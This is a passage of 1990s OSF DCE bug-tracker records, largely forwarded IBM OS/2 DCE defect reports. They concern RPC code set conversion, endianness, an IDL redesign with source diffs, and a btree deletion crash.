REFERENCES (OTHER RELATED DEFECTS, OTHER REQUIRED FIXES OR BLOCKED TESTS):
--------------------------------------------------------------------------
(OPTIONAL)

    <Note by cwang (Cathy Wang), 95/10/23 10:27:27, action: assign>
Old Owner: ywei
New Owner: cwang

A
A



CR Number                     : 13166
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : RPC code set conversion UCS endian specification
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/27/95 public]

Attached is IBM's internal defect report:


prefix        p
name          17942
reference     
abstract      RPC code set conversion UCS endian specification
duplicate     

state         open                        priority                          
severity      3                           target                            
age           6

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       other               
envName                                   phaseFound    design              
level                                     phaseInject                       

addDate       95/10/21 21:43:22           assignDate    95/10/23 10:25:34   
lastUpdate    95/10/23 10:25:34           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   trumble             
ownerName     Cathy Wang                  originName    Trumble, Mary K.    
ownerArea     lwqs                        originArea    AUS/gbrs            

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/10/21 21:43:22    open            trumble (Trumble, Mary K.)
    95/10/23 10:25:34    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by trumble (Trumble, Mary K.), 95/10/21 21:43:22, action: open>

EXTERNAL SYMPTOMS (INCLUDING SPECIFIC ERROR MSGS) (REQUIRED):
-------------------------------------------------------------
None.

FAILING TEST CASE OR DESCRIBE TEST IF FREELANCE (REQUIRED):
------------------------------------------------------------
This problem was discovered by design review.
The problem will not occur in a single-platform environment.

RFC 41.2 does not explicitly specify the endian form of UCS
that will be used for universal code set conversion.  Because
the data type is byte, no endian marshalling will occur for the
UCS data.  HP, AIX, OSF/1 assume big-endian UCS, so they will
not have problems communicating.  OS/2 iconv code assumes
little-endian, so, without modification, OS/2 RPC will send
little-endian data, which will be corrupted by HP, AIX, etc.,
RPC.  Likewise, OS/2 RPC will corrupt data from those systems.


ENVIRONMENT (REQUIRED): Repeat sections as required
---------------------------------------------------
- Provide a description of hw/sw environment: ***N/A***

- Client machine:                     Server machine:
    System (OS/2 -or- AIX):             System (OS/2 -or- AIX):
    Operating System Level: N/A         Operating System Level: N/A
    Hardware Model:         N/A         Hardware Model: N/A
    Amount of RAM (optional):           Amount of RAM (optional):
    Amount of DASD (optional):          Amount of DASD (optional):
    MPTS Level (OS/2):      N/A         MPTS Level (OS/2):
    DCE Build Level:                    DCE Build Level:
    MACHINE NAME (optional):            MACHINE NAME (optional):
    Test tool level (optional):         Test tool level (optional):

- Additional relevant environment info (cell topology) (optional):


DETAILED PROBLEM DESCRIPTION (REQUIRED):
----------------------------------------
See above.


DESCRIBE HOW TO REPRODUCE/VERIFY PROBLEM (REQUIRED):
----------------------------------------------------
- Contact person if other than defect author: Cathy Wang

- Number of times test was attempted? once was enough

- Intermittent failure or fails every time? every time

- Failing platforms (OS/2 or AIX): multiple-platform environments

- Specific steps to recreate: see above


RELATED INFORMATION (OPTIONAL):
-------------------------------

OS/2 iconv will be extended to allow explicit specification of endianness.
OS/2 RPC will explicitly send/receive big-endian UCS data.

OSF should explicitly state that the DCE RPC universal code set is
big-endian, which will conform with ISO 10646.


REFERENCES (OTHER RELATED DEFECTS, OTHER REQUIRED FIXES OR BLOCKED TESTS):
--------------------------------------------------------------------------
(OPTIONAL)

    <Note by cwang (Cathy Wang), 95/10/23 10:25:34, action: assign>
Old Owner: ywei
New Owner: cwang



CR Number                     : 13165
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : code set conversion can not use RMIR method
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/27/95 public]

Attached is IBM's internal defect report:


prefix        p
name          17941
reference     
abstract      code set conversion can not use RMIR method
duplicate     

state         open                        priority                          
severity      3                           target                            
age           6

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       other               
envName                                   phaseFound    unit                
level                                     phaseInject                       

addDate       95/10/21 21:39:45           assignDate    95/10/23 10:22:54   
lastUpdate    95/10/23 10:22:54           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   trumble             
ownerName     Cathy Wang                  originName    Trumble, Mary K.    
ownerArea     lwqs                        originArea    AUS/gbrs            

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/10/21 21:39:45    open            trumble (Trumble, Mary K.)
    95/10/23 10:22:54    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by trumble (Trumble, Mary K.), 95/10/21 21:39:45, action: open>

EXTERNAL SYMPTOMS (INCLUDING SPECIFIC ERROR MSGS) (REQUIRED):
-------------------------------------------------------------
None.

FAILING TEST CASE OR DESCRIBE TEST IF FREELANCE (REQUIRED):
------------------------------------------------------------
This problem was discovered via unit test and code inspection.

rpc_cs_eval_with_universal, rpc_cs_eval_without_universal and
rpc_cs_get_tags contain the following code:

    ------------------------
    smir_true = cmir_true = model_found = 0;
    for (i = 1; i <= method_p->server->count; i++)
    {
       if (model_found)
               break;
       if (method_p->client->codesets[0].c_set
               == method_p->server->codesets[i].c_set)
       {
               smir_true = 1;
               model_found = 1;
       }
       if (method_p->server->codesets[0].c_set
               == method_p->client->codesets[i].c_set)
       {
               cmir_true = 1;
               model_found = 1;
       }
    }
    if (model_found)
    {
       if (smir_true && cmir_true)
       {
            /* RMIR model works */
            method_p->method = RPC_EVAL_RMIR_MODEL;
            etc....
    ------------------------

The RMIR code segment can not be reached because the logic of the loop
exit is wrong.  Control will exit the loop as soon as a usable method
is found, making it impossible to detect the case where multiple usable
methods exist.


ENVIRONMENT (REQUIRED): Repeat sections as required
---------------------------------------------------
- Provide a description of hw/sw environment:

- Client machine:                     Server machine:
    System (OS/2 -or- AIX): OS/2        System (OS/2 -or- AIX): OS/2
    Operating System Level: N/A         Operating System Level: N/A
    Hardware Model:         N/A         Hardware Model: N/A
    Amount of RAM (optional):           Amount of RAM (optional):
    Amount of DASD (optional):          Amount of DASD (optional):
    MPTS Level (OS/2):      N/A         MPTS Level (OS/2):
    DCE Build Level:        100495      DCE Build Level: 100495
    MACHINE NAME (optional):            MACHINE NAME (optional):
    Test tool level (optional):         Test tool level (optional):

- Additional relevant environment info (cell topology) (optional):


DETAILED PROBLEM DESCRIPTION (REQUIRED):
----------------------------------------
See above.


    <Note by cwang (Cathy Wang), 1996/01/22 16:14:55, action: note>
The fix for this defect should be combined with the fix for cr13049.
See cr13049 for the diffs.



CR Number                     : 13164
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : i18n char set compatiblity check fails accross platforms
Reported Date                 : 10/27/95
Found in Baseline             : 1.1
Found Date                    : 10/27/95
Severity                      : B
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/27/95 public]

Attached is IBM's internal defect report:


prefix        p
name          17939
reference     
abstract      i18n char set compatibility check fails across platforms
duplicate     

state         open                        priority                          
severity      3                           target                            
age           6

compName      rpc.runtime.src             answer                            
release       os2dce21                    symptom       other               
envName                                   phaseFound    osf                 
level                                     phaseInject                       

addDate       95/10/21 19:49:22           assignDate    95/10/23 10:18:22   
lastUpdate    95/10/23 10:18:22           responseDate                      
endDate                                

ownerLogin    cwang                       originLogin   trumble             
ownerName     Cathy Wang                  originName    Trumble, Mary K.    
ownerArea     lwqs                        originArea    AUS/gbrs            

tracks: none.

verify: none.

history:
    addDate              action          userLogin (userName)
    -------------------- --------------- ----------------------------------
    95/10/21 19:49:22    open            trumble (Trumble, Mary K.)
    95/10/23 10:18:22    assign          cwang (Cathy Wang)

duplicate defects: none.

duplicate features: none.

sizing: none.

notes:
    <Note by trumble (Trumble, Mary K.), 95/10/21 19:49:22, action: open>

EXTERNAL SYMPTOMS (INCLUDING SPECIFIC ERROR MSGS) (REQUIRED):
-------------------------------------------------------------
When both "to" and "from" code sets are not in the local (host)
registry, character set compatibility checking fails.

FAILING TEST CASE OR DESCRIBE TEST IF FREELANCE (REQUIRED):
------------------------------------------------------------
This failure can not be demonstrated on a current build, as installed.
To demonstrate the problem on OS/2 DCE, install the application client and
server on separate machines.  Run the client and server in processes that
have different code sets which support a common character set.  Replace
the IBM code set registry database on the client with a database
that does not contain the code set of the server process.  Replace the
server's IBM code set registry database with one that does not contain
the code set of the client.  Code set conversion will fail with a
compatibility check error.

ENVIRONMENT (REQUIRED): Repeat sections as required
---------------------------------------------------
- Provide a description of hw/sw environment: ***N/A***

- Client machine:                   Server machine:
    System (OS/2 -or- AIX):             System (OS/2 -or- AIX):
    Operating System Level:             Operating System Level:
    Hardware Model:                     Hardware Model:
    Amount of RAM (optional):           Amount of RAM (optional):
    Amount of DASD (optional):          Amount of DASD (optional):
    MPTS Level (OS/2):                  MPTS Level (OS/2):
    DCE Build Level:                    DCE Build Level:
    MACHINE NAME (optional):            MACHINE NAME (optional):
    Test tool level (optional):         Test tool level (optional):

- Additional relevant environment info (cell topology) (optional):


DETAILED PROBLEM DESCRIPTION (REQUIRED):
----------------------------------------
This problem is caused by an OSF design or architecture problem with
RFC 41.2.

The code attempts to find the server's character set information in
the client's local code set registry.  If the server's code set is
not supported on the client machine, the compatibility check fails.

What *should* happen: Though the server code set is not present, the
client should verify that the code sets are compatible, and it should
convert into the universal code set.

The RFC is ambiguous with respect to the location of the
character set information.  We suspect that the original design point
was to export the character set information to CDS, along with the
code set.  The client could then get the information from the namespace.
Initial code inspection reveals that the necessary infrastructure is in
place to support this design point.

It looks like the design point was changed late in the game, to require
that all machines have identical code set registries.  This is not an
acceptable design point, and even if it were, nothing has been done to
implement it in the 1.1 release.



DESCRIBE HOW TO REPRODUCE/VERIFY PROBLEM (REQUIRED):
----------------------------------------------------
- Contact person if other than defect author: Cathy Wang

- Number of times test was attempted? once was enough

- Intermittent failure or fails every time? every time

- Failing platforms (OS/2 or AIX): any cross-vendor environment

- Specific steps to recreate: see above


RELATED INFORMATION (OPTIONAL):
-------------------------------
Cathy Wang is continuing a detailed code review to verify the feasibility
of a design that uses the CDS namespace to communicate character set
information between the client and server.

This defect can not occur in a pure OS/2 DCE environment, but it should
be fixed before shipping OS/2 DCE.

There are IDD impacts.


REFERENCES (OTHER RELATED DEFECTS, OTHER REQUIRED FIXES OR BLOCKED TESTS):
--------------------------------------------------------------------------
(OPTIONAL)

[12/20/95 public]
Modified the Priority since this is a design issue not a code issue.


    <Note by cwang (Cathy Wang), 1996/02/23 16:11:44, action: note>
IBM has implemented the fix for this defect and will post the following
propoal to OSF and i18n forum:

Hi,

  Last fall we prototyped a solution to the character set compatibility
  check problem (OT 13164).  When we scaled up the prototyped solution,
  we hit size restrictions in the CDS namespace.  Subsequently, we
  implemented 3 alternative solutions that avoid this namespace problem.
  We now would like to present all the alternatives and a recommendation to you.
  Note that all the alternative solutions are trying to change the
  data structure of the code set info (rpc_codeset_mgmt_s_t).  The
  changes to the rpc_cs_set_compat_check() API remains the same as
  originally proposed.


Original proposal:

 A. Changes:

 1. Modify the data structure of code set info:
    -----------------------------------------
    Expand the data structure rpc_codeset_mgmt_t (declared in rpc.idl) to:

    #define CS_CSRC_MAX_CHAR_SETS    15 /* this is defined in csrc.h */
    typedef struct rpc_cs_c_set_s_t {
        unsigned32    c_set;
        unsigned16    ch_sets_num;
        unsigned16    ch_sets[CS_CSRC_MAX_CHAR_SETS];
        unsigned16    c_max_bytes;
    } rpc_cs_c_set_t;
    typedef struct rpc_codeset_mgmt_s_t {
        unsigned32        version;       /* version of this structure */
        unsigned32        count;    /* number of code sets defined */
        [size_is(count)] rpc_cs_c_set_t codesets[];
    } rpc_codeset_mgmt_t, *rpc_codeset_mgmt_p_t;

 2. Modify APIs:
    -----------
    Change the interface of rpc_cs_char_set_compat_check() which is a PUBLIC
    API to:

     #include <dce/rpc.h>
     void rpc_cs_char_set_compat_check(
     rpc_codeset_mgmt_p_t        client_code_sets_array,
     rpc_codeset_mgmt_p_t        server_code_sets_array,
     error_status_t         *status);
     where:
       client_codesets_array and server_codesets_array are integer
       arrays that specify the code sets and char sets that the
       client's or server's host environment supports.   The array
       structure is defined above.

 B. Advantages/Disadvantages:

    Advantages:
      The data is un/marshalled in "byte", this is the most compact way to
      be stored in the CDS Name Space, i.e., no overhead to store node
      information for the un/marshaller.

    Disadvantages:
      1) Un/pickling Porting issue

         Data is un/marshalled in byte causing alignment problems, as
         Seiichi Tsu (HP) commented:

           "The current un/pickling code for rpc_codeset_mgmt_t, defined in
           rpc/sys_idl/codesets.idl, treat it as a simple array of bytes. This
           is just wrong. Since each system/compiler has different alignment/
           padding rule for a structure/array, the RPC_Codesets attribute won't
           be portable. (Of course, the endian-ness is another issue,but at SIG
           you were saying "big-endian"? :-) If IBM is going to fix
           rpc_codeset_mgmt_t in an incompatible way, why not fix codesets.idl
           and make the RPC_Codesets attribute portable?"

      2) Size restrictions in the CDS Namespace

         Hit the size restrictions in the CDS namespace (max number of bytes
         to be stored in CDS entry is 4000) with 15 elements for the
         "ch_sets" array.

      3) Flexibilitity

         Fixed number of array for "ch_sets" CAN NOT support vendor who
         may have very small set of codesets but each codeset have
         very large set of character sets.


Alternative #1 - the recommended proposal:

 A. Changes:

    Modify the data structure of code set info:
    ------------------------------------------
    Extract the rpc_codeset_mgmt_t declarations from rpc.idl and
    create a new idl file: cs_mgmt.idl, which will be imported by
    both rpc.idl and codesets.idl.

    Here are the changes made to cs_mgmt.idl, rpc.idl and codesets.idl:

    cs_mgmt.idl:
    -----------

    [
       uuid(ec267c61-4c7a-11cf-8228-000233002b3e),
       version(1.0)
    ]
    interface codeset_mgmt
    {
    /*
     * R P C _ C O D E S E T _ M G M T _ T
     *
     * Data structure to hold (server's or client's) supported code sets
     * Each code set has an attribute (max bytes) to indicate the maximum
     * number of bytes needed to encode that code set.  This is used to
     * calculate the size of a necessary buffer for code set conversion.
     */
    typedef struct rpc_cs_c_set_s_t {
            unsigned32      c_set;
                unsigned16      c_max_bytes;
            unsigned16      ch_sets_num;
            [ptr, size_is(ch_sets_num)] unsigned16      * ch_sets;
    } rpc_cs_c_set_t;
    typedef struct rpc_codeset_mgmt_s_t {
            unsigned32      version;        /* version of this structure */
            unsigned32      count;          /* number of code sets defined */
            [size_is(count)] rpc_cs_c_set_t codesets[];
    } rpc_codeset_mgmt_t;
    typedef [ptr] rpc_codeset_mgmt_t *rpc_codeset_mgmt_p_t;
    }


    rpc.idl:
    -------

    Add the following line to the rpc.idl and remove the portion which is now
    the cs_mgmt.idl.

    import "cs_mgmt.idl";

    codesets.idl:
    ------------

    [
    uuid(35a38fce-b5d1-11cc-af6f-08000925d3fe),
    version(2.0)
    ]
    interface codesets
    {

    import  "cs_mgmt.idl";

    /*
     *  Maximum number of bytes to be stored in CDS entry.
     *  4000 is defined as MAXATTRIBUTE in dns_record.h.  However, since there
     *  is no IDL file which defines this value, there is no way to include
     *  that information from this file.
     */
    const long nsi_max_attribute_len = 4000;

    /*
     * R P C __ C O D E S E T S _ T O _ N S C O D E S E T S
     *
     * Encode code sets with IDL encoding services for storing in CDS
     */

    void rpc__codesets_to_nscodesets (
            [in] handle_t                   h,
            [in] rpc_codeset_mgmt_p_t       cp
    );
    /*
     * R P C __ N S C O D E S E T S _ T O _ C O D E S E T S
     *
     * Decode code sets with IDL encoding services.
     */

    void rpc__nscodesets_to_codesets (
            [in] handle_t                   h,
            [out] rpc_codeset_mgmt_p_t      *cp
    );
    }

 B. Advantages/Disadvantages:

    Advantages:
      1) Un/pickling Porting issue

         We will un/pickling the data structure rpc_codeset_mgmt_s_t instead
         of byte.  See the changes made to codesets.idl.

      2) Flexibilitity

        Look at the changes in the data structure rpc_cs_c_set_s_t. We changed
        the "ch_sets" into pointer to dynamically malloc'ed character sets.
        This approach allows the support of vendors who may have small set of
        code sets but large set of charactes sets.

    Disadvantages:
      1) More changes to the public interface:

         The call signatures for rpc__codesets_to_nscodesets() and
         rpc__nscodesets_to_codesets() have changed in codesets.idl.

         The declarations of rpc_cs_mgmt_s_t need to be extracted from
         rpc.idl into a new idl file so that it can be imported by
         both rpc.idl and codesets.idl.

      2) Overhead bytes get stored in Name Space

         Un/marshalling "rpc_cs_c_set_t.ch_sets" which is  a pointer to
         dynamically allocated character sets will cause some overhead
         nodes informations to get stored/retrieved from the Name Space.
         There is 4 byte boundary for un/marshalled data.  We found that
         the bytes of a rpc_cs_c_set_s_t in the Name Space in general
         looks like this:
           4 bytes - c_set
           2 bytes - c_max_bytes
           2 bytes - ch_sets_num
           4 bytes - NSI pointer (node)
           4 bytes - number of ch_sets, this is also a NSI node
           4 bytes or more - data (in 4 byte boundary)

Alternative #2:

 A. Changes:

    All the changes are the same as Alternative #1, except
    the ch_sets is declared as a variable array:

    typedef struct rpc_cs_c_set_s_t {
            unsigned32      c_set;
            unsigned16      c_max_bytes;

            unsigned16      ch_sets_num;
            [length_is(ch_sets_num)] unsigned16      ch_sets[CS_CSRC_MAX_CHAR_ETS)];
   } rpc_cs_c_set_t;
    typedef struct rpc_codeset_mgmt_s_t {
            unsigned32      version;        /* version of this structure */
            unsigned32      count;          /* number of code sets defined */
            [size_is(count)] rpc_cs_c_set_t codesets[];
    } rpc_codeset_mgmt_t,  *rpc_codeset_mgmt_p_t;
    }

 B. Advantages/Disadvantages:

      It has all the advantages of alternative #1, plus theoriticaly, it will
      not have the overhead of storing the NSI pointer(node) in the CDS NameSpce.    According to DCE Appl Dev Guide: "The length_is attribute is one of
      the attributes that can be used to allow the amount of data in an
      array that will be transmitted to be determined at runtime."
      This does NOT appear to be true,
      ch_sets is defined in the IDL-generated cs_mgmt.h as
      unsigned16 ch_sets[15]; just the same as the fixed number array
      in the original proposal.  The CDS NameSpace entry for the code set
      looks just the same as the original proposal as well.  This approach
      does not solve the alighment problem, either.


Alternative #3:

 A. Changes:

      All the changes are the same as the original proposal with maximum numof char set < 15.

 B. Advantages/Disadvantages:

      For the IBM registry maximum number character sets would have to be <5,
      in oder to fit in the namespace.  This is too restrictive.  This
      alternative also does not address the alighment problems.

[9/4/96  public]

Here are the diffs to fix the problem:

rpc/runtime/Makefile
--------------------
131c131
<      lbase.idl   mgmt.idl   nbase.idl  ncastat.idl  rpc.idl cs_mgmt.idl \
---
>      lbase.idl   mgmt.idl   nbase.idl  ncastat.idl  rpc.idl      \


rpc/sys_idl/codesets.idl
------------------------
62c62
< version(2.0)
---
> version(1.0)
67,69d66
< import  "dce/cs_mgmt.idl";
<
<
86c83,84
<         [in] rpc_codeset_mgmt_p_t       cp
---
>   [in] long           num,
>   [in, size_is(num)] byte     codesets[]
97c95,96
<         [out] rpc_codeset_mgmt_p_t      *cp
---
>   [in, out] long          *num,
>   [out, size_is(*num)] byte   codesets[]

rpc/sys_idl/rpc.idl
-------------------
104d103
< import "dce/cs_mgmt.idl";
106d104
<
1449a1448,1458
> typedef struct rpc_cs_c_set_s_t {
>   unsigned32  c_set;
>   unsigned16  c_max_bytes;
> } rpc_cs_c_set_t;
>
> typedef struct rpc_codeset_mgmt_s_t {
>   unsigned32      version;    /* version of this structure */
>   unsigned32  count;      /* number of code sets defined */
>   [size_is(count)] rpc_cs_c_set_t codesets[];
> } rpc_codeset_mgmt_t, *rpc_codeset_mgmt_p_t;
>
1451,1454d1459
<  * Move the code set management structures: rpc_cs_c_set_t and
<  * rpc_codeset_mgmt_t to cs_mgmt.idl.  CMVC 17939 (OT13164)
<  */
< /*
1592,1593c1597,1598
<     [in]        rpc_codeset_mgmt_p_t            client_code_sets_array,
<     [in]        rpc_codeset_mgmt_p_t            server_code_sets_array,
---
>     [in]  unsigned32          client_codeset,
>     [in]  unsigned32          server_codeset,

new file added to rpc/sys_idl:  cs_mgmt.idl
                  -------------------------
1,47d0
< /*
<  * COMPONENT_NAME:  rpc.idl.src
<  *
<  * FUNCTIONS:
<  *
<  * ORIGINS: 72
<  *
<  */
< /*
<  * HISTORY
<  * $Log:	c013164,v $
# Revision 1.5  96/09/04  11:50:07  root
# changed fields:  new/changed/deleted note(s) [cwang 9/4/96 public]
# 
<  *
<  * CR: 13164 (IBM cmvc 17939) 1996/01/29      cwang
<  *     Extracted from rpc.idl for RPC runtime I18N support.
<  *
<  * $EndLog$
<  */
<
< [
<     uuid(ec267c61-4c7a-11cf-8228-000233002b3e),
<     version(1.0)
< ]
< interface codeset_mgmt
< {
< /*
<  * R P C _ C O D E S E T _ M G M T _ T
<  *
<  * Data structure to hold (server's or client's) supported code sets
<  * Each code set has an attribute (max bytes) to indicate the maximum
<  * number of bytes needed to encode that code set.  This is used to
<  * calculate the size of a necessary buffer for code set conversion.
<  */
< typedef struct rpc_cs_c_set_s_t {
<   unsigned32  c_set;
<   unsigned16  c_max_bytes;
<   unsigned16  ch_sets_num;
<   [ptr, size_is(ch_sets_num)] unsigned16      * ch_sets;
< } rpc_cs_c_set_t;
< typedef struct rpc_codeset_mgmt_s_t {
<   unsigned32  version;    /* version of this structure */
<   unsigned32  count;      /* number of code sets defined */
<   [size_is(count)] rpc_cs_c_set_t codesets[];
< } rpc_codeset_mgmt_t;
< typedef [ptr] rpc_codeset_mgmt_t *rpc_codeset_mgmt_p_t;
< }


rpc/runtime/cs_s_eval.c
-----------------------
459,460c459,460
<                         method_p->client,
<                         method_p->server,
---
>           method_p->client->codesets[0].c_set,
>           method_p->server->codesets[0].c_set,
752,753c752,753
<                         method_p->client,
<                         method_p->server,
---
>           method_p->client->codesets[0].c_set,
>           method_p->server->codesets[0].c_set,
904,906c904,905
< **    client_code_sets_array
< **                        Array containing all of the information for the
< **                        client's supported codesets.
---
> **    client_codeset      OSF code set registry value for client's current
> **                code set.
908,910c907,908
< **    server_code_sets_array
< **                        Array containing all of the information for the
< **                server's supported codesets.
---
> **    server_codeset      OSF code set registry value for server's current
> **                code set.
936,937c934,935
<         rpc_codeset_mgmt_p_t            client_code_sets_array,
<         rpc_codeset_mgmt_p_t            server_code_sets_array,
---
>   unsigned32      client_codeset,
>   unsigned32      server_codeset,
941,943c939,941
< (client_code_sets_array, server_code_sets_array, status)
<         rpc_codeset_mgmt_p_t            client_code_sets_array,
<         rpc_codeset_mgmt_p_t            server_code_sets_array,
---
> (client_codeset, server_codeset, status)
>   unsigned32      client_codeset;
>   unsigned32      server_codeset;
946d943
<
947a945
>   unsigned_char_t *client_code_set_name;
949a948
>   unsigned_char_t *server_code_set_name;
953,956c952,957
<   client_char_sets_number = client_code_sets_array->codesets[0].ch_sets_num;
<   c_sets_save = client_char_sets_value = client_code_sets_array->codesets[0].ch_sets;
<   server_char_sets_number = server_code_sets_array->codesets[0].ch_sets_num;
<   s_sets_save = server_char_sets_value = server_code_sets_array->codesets[0].ch_sets;
---
>   dce_cs_rgy_to_loc (
>       client_codeset,
>       &client_code_set_name,
>       &client_char_sets_number,
>       &client_char_sets_value,
>       status );
957a959,960
>   if (*status != dce_cs_c_ok)
>       return;
958a962,978
>   c_sets_save = client_char_sets_value;
>
>   dce_cs_rgy_to_loc (
>       server_codeset,
>       &server_code_set_name,
>       &server_char_sets_number,
>       &server_char_sets_value,
>       status );
>
>   if (*status != dce_cs_c_ok)
>   {
>       free(c_sets_save);
>       return;
>   }
>
>   s_sets_save = server_char_sets_value;
>
992a1013,1014
>   free(c_sets_save);
>   free(s_sets_save);
1163,1164d1184
<
<         rpc_ns_mgmt_free_codesets(&client, status);



rpc/runtime/cs_s_reg.c
----------------------
920,921d919
<         entry_t         **epptmp;
<         int             j;
931c929
<   epptmp = epp = rpc_g_codesets_sort_by_priority;
---
>   epp = rpc_g_codesets_sort_by_priority;
945,969d942
<         for (i=0;i<(rpc_g_codesets_effective_count);i++) {
<                 RPC_MEM_ALLOC (
<                         (*codesets_p)->codesets[i].ch_sets,
<                         unsigned16 *,
<                         (sizeof(unsigned16)) * ((*epptmp)->char_sets_num),
<                         RPC_C_MEM_CDS_ATTR,
<                         RPC_C_MEM_WAITOK);
<           if ( (*codesets_p)->codesets[i].ch_sets == NULL){
<                         for (j=0;j<i;j++) {
<                                RPC_MEM_FREE  (
<                                (*codesets_p)->codesets[j].ch_sets,
<                                RPC_C_MEM_CDS_ATTR);
<                                (*codesets_p)->codesets[j].ch_sets = NULL;
<                         }
<                         RPC_MEM_FREE (*codesets_p, RPC_C_MEM_CDS_ATTR);
<                         *codesets_p = NULL;
<
<                   *status = rpc_s_no_memory;
<                   return;
<                 }
<
<             epptmp++;
<         }
<
<
1003a977
>
1005,1008d978
<                         (*codesets_p)->codesets[i].ch_sets_num = (*epp)->char_sets_num;
<                         for (j=0; j<(*epp)->char_sets_num;j++ )
<                         {
<                            (*codesets_p)->codesets[i].ch_sets[j] = (*epp)->char_sets[j];
1010,1011d979
<
<       }
1015,1019d982
<                         (*codesets_p)->codesets[0].ch_sets_num = (*epp)->char_sets_num;
<                         for (j=0; j<(*epp)->char_sets_num;j++ )
<                         {
<                            (*codesets_p)->codesets[0].ch_sets[j] = (*epp)->char_sets[j];
<                         }


rpc/runtime/cs_s_stub.c
-----------------------
2364,2365c2364,2365
<                                 client,
<                                 server,
---
>               client->codesets[0].c_set,
>               server->codesets[0].c_set,


rpc/runtime/ns_s_attr.c
-----------------------
219c219,222
<         rpc__codesets_to_nscodesets(es_h, (rpc_codeset_mgmt_t *)codeset_val);
---
>       encoding_size = sizeof(codeset_val->version) +
>               sizeof(codeset_val->count)   +
>               sizeof(codeset_val->codesets[0]) * codeset_val->count;
>       rpc__codesets_to_nscodesets(es_h, encoding_size, (idl_byte *)codeset_val);
221d223
<
505d506
<     rpc_codeset_mgmt_p_t    *temp_value;
564,572c565,571
<             temp_value = (rpc_codeset_mgmt_p_t *)value;
<
<             RPC_MEM_ALLOC (
<                   *temp_value,
<                   rpc_codeset_mgmt_p_t,
<                   nsi_out_length,
<                   RPC_C_MEM_CDS_ATTR,
<                   RPC_C_MEM_WAITOK);
<           if (*temp_value == NULL){
---
>           RPC_MEM_ALLOC (
>               *value,
>               unsigned_char_p_t,
>               nsi_out_length,
>               RPC_C_MEM_CDS_ATTR,
>               RPC_C_MEM_WAITOK);
>           if (*value == NULL){
580c579
<             rpc__nscodesets_to_codesets(es_h, temp_value);
---
>           rpc__nscodesets_to_codesets(es_h, (idl_long_int *)length, (idl_byte *)(*value));
582d580
<
954,955d951
<     int     i;
<
957,967d952
<
<     for (i=0;i<((*codesets)->count);i++)
<     {
<         if (((*codesets)->codesets[i].ch_sets) != NULL)
<         {
<         RPC_MEM_FREE (
<             (*codesets)->codesets[i].ch_sets,
<             RPC_C_MEM_CDS_ATTR);
<         (*codesets)->codesets[i].ch_sets = NULL;
<         }
<     }



CR Number                     : 13163
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : 
Short Description             : Segmentation fault restoring consumer table from backing store
Reported Date                 : 10/26/95
Found in Baseline             : 1.1
Found Date                    : 10/26/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[10/26/95 public]

The problem is that the btree code is trying to delete the same thing twice,
and the second time, since the entry no longer exists, when it tries to close
up the gap it gets a negative length for memmove, and tries to move the whole
address space.

There's some sort of confusion with the B_DELCRSR flag, and when it should be
set and cleared.  In bt_bdelete, if the entry to be deleted is pointed at by
the cursor, instead of deleting the entry they just set the B_DELCRSR flag,
and later on when they sync the file, if the B_DELCRSR flag is set it really
does the delete of the entry, flushes the page to disk, and then it restores
the old page with the entry still undeleted.  Apparently it's important for the
cursor to point to an undeleted entry.  The problem arises when another entry
is deleted, and the index entries on the page are shifted in __bt_dleaf.  Now
that the entries have shifted, the cursor index is no longer valid.  The next
time the file is synced, the delete gets done again since the flag is still set,
but the cursor is an invalid entry.  It should have been updated when the index
entries were shifted, I guess.

I think the right thing would be in __bt_dleaf, check to see if the pgno of
bt_bcursor is the same as that of the current page, and if the index of the 
bt_bcursor is less than the index being deleted.  If so, decrement the index 
of bt_bcursor.  This should probably be done at the end just before returning
RET_SUCCESS.

[7/19/96 public]
Since IBM has a fix for this can they submit the diffs here?

[9/3/96 public]
No answer back from IBM yet, downgrading due to lack of information and
a test case.



CR Number                     : 13161
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : dacl_read, dacl_replica tests fail
Reported Date                 : 10/25/95
Found in Baseline             : 1.2
Found Date                    : 09/29/95
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
